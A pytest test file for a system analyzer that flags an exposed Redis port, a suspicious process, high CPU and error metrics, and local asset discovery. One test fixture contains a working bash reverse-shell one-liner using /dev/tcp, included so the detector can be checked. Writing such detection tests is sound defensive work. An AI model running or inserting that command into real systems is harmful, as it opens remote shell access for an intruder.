from __future__ import annotations

from shared.tools import system_analyzer_tools as sat


def _base_discovered_assets() -> dict:
    return {
        "runtime_profile": "host-process",
        "systemd": {"count": 2, "running_services": []},
        "docker": {"count": 0, "running_containers": []},
        "open_ports": {"count": 0, "listeners": []},
        "processes": {"sample_count": 0, "sample": [], "python_service_count": 0},
        "service_process_map": [],
        "monitoring_targets": [],
    }


def test_analyzer_detects_exposed_sensitive_port() -> None:
    discovered_assets = _base_discovered_assets()
    discovered_assets["open_ports"] = {
        "count": 1,
        "listeners": [
            {
                "port": 6379,
                "local_address": "0.0.0.0:6379",
                "protocol": "tcp",
                "pid": 2481,
                "process": "redis-server",
            }
        ],
    }
    metrics_bundle = {"source": "live", "series": []}

    result = sat.analyze_system_services(discovered_assets=discovered_assets, metrics_bundle=metrics_bundle)
    sensitive_port_findings = [finding for finding in result["findings"] if finding["id"] == "port-6379"]

    assert sensitive_port_findings
    assert sensitive_port_findings[0]["severity"] == "high"
    assert sensitive_port_findings[0]["category"] == "cybersecurity"
    assert result["risk_scores"]["cybersecurity_risk"] > 0


def test_analyzer_detects_suspicious_process_pattern() -> None:
    discovered_assets = _base_discovered_assets()
    discovered_assets["processes"] = {
        "sample_count": 1,
        "python_service_count": 0,
        "sample": [
            {
                "pid": 4040,
                "command": "bash",
                "args": "bash -i >& /dev/tcp/192.168.1.10/4444 0>&1",
            }
        ],
    }

    result = sat.analyze_system_services(discovered_assets=discovered_assets, metrics_bundle={"source": "live", "series": []})

    critical_findings = [finding for finding in result["findings"] if finding["severity"] == "critical"]
    assert critical_findings
    assert any("Suspicious process pattern" in finding["title"] for finding in critical_findings)


def test_analyzer_detects_metric_pressure_and_mock_note() -> None:
    discovered_assets = _base_discovered_assets()
    metrics_bundle = {
        "source": "mock",
        "series": [
            {"name": "cpu_usage_percent", "latest": 96.1},
            {"name": "error_rate_percent", "latest": 5.2},
        ],
    }

    result = sat.analyze_system_services(discovered_assets=discovered_assets, metrics_bundle=metrics_bundle)
    metric_findings = [finding for finding in result["findings"] if finding["id"].startswith("metric-")]

    assert metric_findings
    assert result["risk_scores"]["monitoring_risk"] > 0
    assert "Telemetry source is mock" in result["notes"][0]
    assert result["risk_scores"]["confidence"] == 0.45


def test_analyze_local_system_uses_discovery_and_metrics(monkeypatch) -> None:
    fake_assets = _base_discovered_assets()
    fake_metrics = {"source": "live", "series": []}

    monkeypatch.setattr(sat, "discover_runtime_assets", lambda: fake_assets)
    monkeypatch.setattr(sat, "fetch_metrics", lambda query: {"query": query, **fake_metrics})

    result = sat.analyze_local_system("check")

    assert result["query"] == "check"
    assert result["discovered_assets"] == fake_assets
    assert result["metrics"]["source"] == "live"
    assert "analysis" in result
